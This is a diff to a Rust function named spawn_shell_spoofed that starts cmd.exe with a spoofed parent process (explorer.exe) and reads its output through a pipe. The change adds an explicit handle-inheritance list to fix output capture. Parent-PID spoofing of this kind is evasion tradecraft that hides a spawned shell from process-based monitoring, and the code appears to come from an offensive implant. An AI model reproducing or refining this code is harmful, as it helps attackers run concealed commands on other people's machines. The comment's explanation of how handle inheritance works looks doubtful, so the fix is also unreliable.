@@ -319,16 +319,22 @@ pub fn spawn_shell_spoofed(cmd: &str) -> Result<Vec<u8>, &'static str> {
     extern "system" { fn SetHandleInformation(h: HANDLE, mask: u32, flags: u32) -> i32; }
     unsafe { SetHandleInformation(rd, 1 /*HANDLE_FLAG_INHERIT*/, 0); }
 
-    // Build the proc-thread attribute list for PPID override.
+    // Build the proc-thread attribute list: PPID override + explicit handle list.
+    // When PROC_THREAD_ATTRIBUTE_PARENT_PROCESS is set, the child inherits handles
+    // from the spoofed parent (explorer.exe), not from us — so the pipe write end
+    // would never reach cmd.exe.  PROC_THREAD_ATTRIBUTE_HANDLE_LIST overrides this
+    // by explicitly naming which handles to pass through, regardless of parent.
+    const PROC_THREAD_ATTRIBUTE_HANDLE_LIST: usize = 0x0002_0002;
+
     let mut attr_size: usize = 0;
-    unsafe { InitializeProcThreadAttributeList(core::ptr::null_mut(), 1, 0, &mut attr_size) };
+    unsafe { InitializeProcThreadAttributeList(core::ptr::null_mut(), 2, 0, &mut attr_size) };
     if attr_size == 0 {
         unsafe { CloseHandle(rd); CloseHandle(wr); CloseHandle(parent) };
         return Err("InitializeProcThreadAttributeList sizing failed");
     }
     let mut attr_buf = vec![0u8; attr_size];
     let attr_list = attr_buf.as_mut_ptr() as *mut _;
-    if unsafe { InitializeProcThreadAttributeList(attr_list, 1, 0, &mut attr_size) } == 0 {
+    if unsafe { InitializeProcThreadAttributeList(attr_list, 2, 0, &mut attr_size) } == 0 {
         unsafe { CloseHandle(rd); CloseHandle(wr); CloseHandle(parent) };
         return Err("InitializeProcThreadAttributeList init failed");
     }
@@ -343,7 +349,20 @@ pub fn spawn_shell_spoofed(cmd: &str) -> Result<Vec<u8>, &'static str> {
         )
     } == 0 {
         unsafe { DeleteProcThreadAttributeList(attr_list); CloseHandle(rd); CloseHandle(wr); CloseHandle(parent) };
-        return Err("UpdateProcThreadAttribute failed");
+        return Err("UpdateProcThreadAttribute(parent) failed");
+    }
+    let mut inherit_list: [HANDLE; 1] = [wr];
+    if unsafe {
+        UpdateProcThreadAttribute(
+            attr_list, 0,
+            PROC_THREAD_ATTRIBUTE_HANDLE_LIST,
+            inherit_list.as_mut_ptr() as *mut _,
+            core::mem::size_of::<HANDLE>(),
+            core::ptr::null_mut(), core::ptr::null_mut(),
+        )
+    } == 0 {
+        unsafe { DeleteProcThreadAttributeList(attr_list); CloseHandle(rd); CloseHandle(wr); CloseHandle(parent) };
+        return Err("UpdateProcThreadAttribute(handle_list) failed");
     }
 
     // Redirect stdout + stderr to the write end of our pipe.
